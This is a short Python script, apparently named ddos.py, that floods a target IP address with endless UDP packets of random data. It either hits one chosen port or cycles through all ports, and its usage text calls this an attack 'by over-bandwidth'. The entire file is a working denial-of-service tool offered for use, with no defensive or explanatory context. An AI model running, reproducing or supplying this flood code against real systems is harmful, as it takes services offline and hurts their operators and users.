#coding=utf-8

import sys
import os
import socket
import random
#import time
#from datatime import datetime

def ddos(dst_ip, mode):
    if (mode == 'all' or mode == 'default'):
        isCycle = 1
        dst_port = 1
    else:
        isCycle = 0
        dst_port = int(mode)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1490)
 

    sent = 0

    while(1):
        sock.sendto(payload, (dst_ip, dst_port))
        sent = sent + 1
        
        if isCycle == 1:
            dst_port = dst_port + 1

        print("Sent %s packet to port %s of %s" %(sent, dst_port, dst_ip))
        if(dst_port >= 65535):
            dst_port = 1

def main():
    status = 1
    argv = sys.argv
    if(len(argv) == 2):
        dst_ip = argv[1]
        mode = "default"
    elif(len(argv) == 3):
        dst_ip = argv[1]
        mode = argv[2]
    else:
        status = 0
        print("Usage:   ddos.py DST_IP [MODE]")
        print("\t\t\tdefault mode:\tbandwidth mode for default")
        print("\t\t\tport mode:\t[MODE] should be a port number")
        print("\t\t\tall mode:\tAttack by over-bandwidth\n")
    
    if(status == 1):
        ddos(dst_ip, mode)

if(__name__ == "__main__"):
    main()